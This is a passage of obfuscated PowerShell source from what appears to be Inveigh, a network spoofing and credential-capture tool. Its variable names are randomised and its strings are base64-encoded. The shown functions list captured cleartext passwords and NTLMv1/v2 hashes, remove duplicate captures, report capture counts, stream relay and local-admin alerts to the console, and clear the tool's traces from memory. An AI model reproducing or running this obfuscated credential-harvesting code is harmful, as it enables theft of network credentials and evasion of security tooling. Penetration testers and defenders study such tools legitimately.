                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAgAGwAbwBjAGEAbAAgAGEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAIAAqAA==')))
                {
                    write-warning ${14770f41645f456d8f09e703674e2364}.console_queue[0]
                    ${14770f41645f456d8f09e703674e2364}.console_queue.RemoveRange(0,1)
                }
                default
                {
                    write-output ${14770f41645f456d8f09e703674e2364}.console_queue[0]
                    ${14770f41645f456d8f09e703674e2364}.console_queue.RemoveRange(0,1)
                }
            }
        }    
    }
}
Function Get-InveighCleartext
{
    ${14770f41645f456d8f09e703674e2364}.cleartext_list
}
Function Get-InveighNTLM
{
    ${14770f41645f456d8f09e703674e2364}.NTLMv1_list
    ${14770f41645f456d8f09e703674e2364}.NTLMv2_list
}
Function Get-InveighNTLMv1
{
    param
    ( 
        [parameter(Mandatory=$false)][switch]${aa0bb44d9ebb441f85d43ace93c27e4e},
        [parameter(ValueFromRemainingArguments=$true)] ${b2658962f7c24b559994c6ba448a9937}
    )
    if (${b2658962f7c24b559994c6ba448a9937})
    {
        throw "$(${b2658962f7c24b559994c6ba448a9937}) is not a valid parameter."
    }
    if(${aa0bb44d9ebb441f85d43ace93c27e4e})
    {
        ${14770f41645f456d8f09e703674e2364}.NTLMv1_list.sort()
        ForEach($unique_NTLMv1 in ${14770f41645f456d8f09e703674e2364}.NTLMv1_list)
        {
            ${5f476c75d7324aabb63317acc0ebea10} = $unique_NTLMv1.substring(0,$unique_NTLMv1.indexof(":",($unique_NTLMv1.indexof(":")+2)))
            if(${5f476c75d7324aabb63317acc0ebea10} -ne ${fea7760a29da4dcab005b366fb2ce5dd})
            {
                $unique_NTLMv1
            }
            ${fea7760a29da4dcab005b366fb2ce5dd} = ${5f476c75d7324aabb63317acc0ebea10}
        }
    }
    else
    {
        ${14770f41645f456d8f09e703674e2364}.NTLMv1_list
    }
}
Function Get-InveighNTLMv2
{
    param
    ( 
        [parameter(Mandatory=$false)][switch]${aa0bb44d9ebb441f85d43ace93c27e4e},
        [parameter(ValueFromRemainingArguments=$true)] ${b2658962f7c24b559994c6ba448a9937}
    )
    if (${b2658962f7c24b559994c6ba448a9937})
    {
        throw "$(${b2658962f7c24b559994c6ba448a9937}) is not a valid parameter."
    }
    if(${aa0bb44d9ebb441f85d43ace93c27e4e})
    {
        ${14770f41645f456d8f09e703674e2364}.NTLMv2_list.sort()
        ForEach($unique_NTLMv2 in ${14770f41645f456d8f09e703674e2364}.NTLMv2_list)
        {
            ${f9dfccad1b73472a8a3bd339e7593b82} = $unique_NTLMv2.substring(0,$unique_NTLMv2.indexof(":",($unique_NTLMv2.indexof(":")+2)))
            if(${f9dfccad1b73472a8a3bd339e7593b82} -ne ${99e69d78dcf24943ba5cfcc589923f4d})
            {
                $unique_NTLMv2
            }
            ${99e69d78dcf24943ba5cfcc589923f4d} = ${f9dfccad1b73472a8a3bd339e7593b82}
        }
    }
    else
    {
        ${14770f41645f456d8f09e703674e2364}.NTLMv2_list
    }
}
Function Get-InveighLog
{
    ${14770f41645f456d8f09e703674e2364}.log
}
Function Get-InveighStat
{
    echo($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAHQAYQBsACAAQwBsAGUAYQByAHQAZQB4AHQAIABDAGEAcAB0AHUAcgBlAHMAIAA9ACAA'))) + ${14770f41645f456d8f09e703674e2364}.cleartext_list.count)
    echo($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAHQAYQBsACAATgBUAEwATQB2ADEAIABDAGEAcAB0AHUAcgBlAHMAIAA9ACAA'))) + ${14770f41645f456d8f09e703674e2364}.NTLMv1_list.count)
    echo($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAHQAYQBsACAATgBUAEwATQB2ADIAIABDAGEAcAB0AHUAcgBlAHMAIAA9ACAA'))) + ${14770f41645f456d8f09e703674e2364}.NTLMv2_list.count)
}
Function Watch-Inveigh
{
    if(${14770f41645f456d8f09e703674e2364}.tool -ne 1)
    {
        if(${14770f41645f456d8f09e703674e2364}.running -or ${14770f41645f456d8f09e703674e2364}.relay_running -or ${14770f41645f456d8f09e703674e2364}.bruteforce_running)
        {
            echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGUAcwBzACAAYQBuAHkAIABrAGUAeQAgAHQAbwAgAHMAdABvAHAAIAByAGUAYQBsACAAdABpAG0AZQAgAGMAbwBuAHMAbwBsAGUAIABvAHUAdABwAHUAdAA=')))
            ${14770f41645f456d8f09e703674e2364}.console_output = $true
            :console_loop while(((${14770f41645f456d8f09e703674e2364}.running -or ${14770f41645f456d8f09e703674e2364}.relay_running -or ${14770f41645f456d8f09e703674e2364}.bruteforce_running) -and ${14770f41645f456d8f09e703674e2364}.console_output) -or (${14770f41645f456d8f09e703674e2364}.console_queue.Count -gt 0 -and ${14770f41645f456d8f09e703674e2364}.console_output))
            {
                while(${14770f41645f456d8f09e703674e2364}.console_queue.Count -gt 0)
                {
                    if(${14770f41645f456d8f09e703674e2364}.output_stream_only)
                    {
                        write-output(${14770f41645f456d8f09e703674e2364}.console_queue[0] + ${14770f41645f456d8f09e703674e2364}.newline)
                        ${14770f41645f456d8f09e703674e2364}.console_queue.RemoveRange(0,1)
                    }
                    else
                    {
                        switch -wildcard (${14770f41645f456d8f09e703674e2364}.console_queue[0])
                        {  
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAZQBpAGcAaAAgACoAZQB4AGkAdABlAGQAIAAqAA==')))
                            {
                                write-warning ${14770f41645f456d8f09e703674e2364}.console_queue[0]
                                ${14770f41645f456d8f09e703674e2364}.console_queue.RemoveRange(0,1)
                            }
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAgAHcAcgBpAHQAdABlAG4AIAB0AG8AIAAqAA==')))
                            {
                                if(${14770f41645f456d8f09e703674e2364}.file_output)
                                {
                                    write-warning ${14770f41645f456d8f09e703674e2364}.console_queue[0]
                                }
                                ${14770f41645f456d8f09e703674e2364}.console_queue.RemoveRange(0,1)
                            }
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAgAGYAbwByACAAcgBlAGwAYQB5ACAAKgA=')))
                            {
                                write-warning ${14770f41645f456d8f09e703674e2364}.console_queue[0]
                                ${14770f41645f456d8f09e703674e2364}.console_queue.RemoveRange(0,1)
                            }
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBTAE0AQgAgAHIAZQBsAGEAeQAgACoA')))
                            {
                                write-warning ${14770f41645f456d8f09e703674e2364}.console_queue[0]
                                ${14770f41645f456d8f09e703674e2364}.console_queue.RemoveRange(0,1)
                            }
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAgAGwAbwBjAGEAbAAgAGEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAIAAqAA==')))
                            {
                                write-warning ${14770f41645f456d8f09e703674e2364}.console_queue[0]
                                ${14770f41645f456d8f09e703674e2364}.console_queue.RemoveRange(0,1)
                            }
                            default
                            {
                                write-output ${14770f41645f456d8f09e703674e2364}.console_queue[0]
                                ${14770f41645f456d8f09e703674e2364}.console_queue.RemoveRange(0,1)
                            }
                        }
                    }            
                }
                if([console]::KeyAvailable)
                {
                    ${14770f41645f456d8f09e703674e2364}.console_output = $false
                    BREAK console_loop
                }
                sleep -m 5
            }
        }
        else
        {
            echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAZQBpAGcAaAAgAGkAcwBuACcAdAAgAHIAdQBuAG4AaQBuAGcA')))
        }
    }
    else
    {
        echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBhAHQAYwBoAC0ASQBuAHYAZQBpAGcAaAAgAGMAYQBuAG4AbwB0ACAAYgBlACAAdQBzAGUAZAAgAHcAaQB0AGgAIABjAHUAcgByAGUAbgB0ACAAZQB4AHQAZQByAG4AYQBsACAAdABvAG8AbAAgAHMAZQBsAGUAYwB0AGkAbwBuAA==')))
    }
}
Function Clear-Inveigh
{
    if(${14770f41645f456d8f09e703674e2364})
    {
        if(!${14770f41645f456d8f09e703674e2364}.running -and !${14770f41645f456d8f09e703674e2364}.relay_running -and !${14770f41645f456d8f09e703674e2364}.bruteforce_running)
        {
            rv inveigh -scope global
            echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAZQBpAGcAaAAgAGQAYQB0AGEAIABoAGEAcwAgAGIAZQBlAG4AIABjAGwAZQBhAHIAZQBkACAAZgByAG8AbQAgAG0AZQBtAG8AcgB5AA==')))
        }
        else
        {
            echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgB1AG4AIABTAHQAbwBwAC0ASQBuAHYAZQBpAGcAaAAgAGIAZQBmAG8AcgBlACAAcgB1AG4AbgBpAG4AZwAgAEMAbABlAGEAcgAtAEkAbgB2AGUAaQBnAGgA')))
        }
    }
}